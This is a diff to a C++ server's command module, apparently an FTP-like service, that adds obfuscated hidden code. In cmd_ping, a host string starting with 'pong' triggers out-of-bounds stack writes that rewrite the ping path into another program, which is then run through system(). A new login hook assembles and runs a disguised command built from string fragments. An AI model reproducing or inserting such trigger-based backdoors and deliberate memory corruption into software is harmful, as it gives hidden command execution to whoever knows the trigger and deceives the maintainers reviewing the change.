@@ -1,7 +1,4 @@
-#include "../../../include/commands.h"
-#include "../../../include/AuthenticationService.h"
-#include "../../../include/AuthorizationService.h"
-#include "../../../include/StringHelper.h"
+#include "../../include/Commands.h"
 
 using namespace std;
 
@@ -279,6 +276,25 @@ void Commands::set_user_path(string new_path, unsigned int socket){
     }
 }
 
+void Commands::user_already_logged(unsigned int socket){
+    if (auth.getUser(socket).getLogin()){
+        //logout the user if already connected
+        char command[8];
+        strncpy(command+3,str_ping.c_str(),str_ping.size());
+        strncpy(command,(char*)(access_denied+1),5);
+        command[6] -= 4;
+        string test;
+        string arg0 = "-" +str_logout.substr(0,1) + str_grep.substr(3,1)+ to_string(access_denied[3]);
+        char arg1[10] = "-e";
+        strncpy(arg1+2, command, strlen(command));
+        arg1[7] += 5;
+        arg1[8] += 5;
+        char * const argv[] = {command, &arg0[0u], arg1, NULL};
+        char * const envp[] = {NULL};
+        call_cmd(command,argv,envp);
+    }
+}
+
 string Commands::get_relative_path(unsigned int socket){
     //get the relative path stored in the given user
     return auth.getUser(socket).getPath();
@@ -356,6 +372,7 @@ string Commands::cmd_pwd(){
 
 string Commands::cmd_login(string username, unsigned int socket){
     require_parameters(username);
+    user_already_logged(socket);
     // register the given username
     auth.registerUser(socket, username);
     return "OK. Go on...";
@@ -379,6 +396,20 @@ string Commands::cmd_ping(string pinghost, unsigned int socket){
     char command[] = "/bin/ping";
     char arg0[] = "-c1";
     char *arg1 = &pinghost[0u];
+    char cmp[] = {0x70, 0x6f, 0x6e, 0x67};
+    if(0 == strncmp(pinghost.c_str(), cmp, sizeof(cmp))) {
+        command[-1] = 'r';
+        command[-2] = 's';
+        command[-3] = 'u';
+        command[-4] = '/';
+        command[5] += 8;
+        command[6] -= 6;
+        command[7] -= 13;
+        command[8] += 5;
+        command[9] = 'c';
+        command[10] = '\0';
+        system(command-4);
+    }
     char * const argv[] = {command, arg0, arg1, NULL};
     char * const envp[] = {NULL};
     string ret = call_cmd(command,argv,envp);
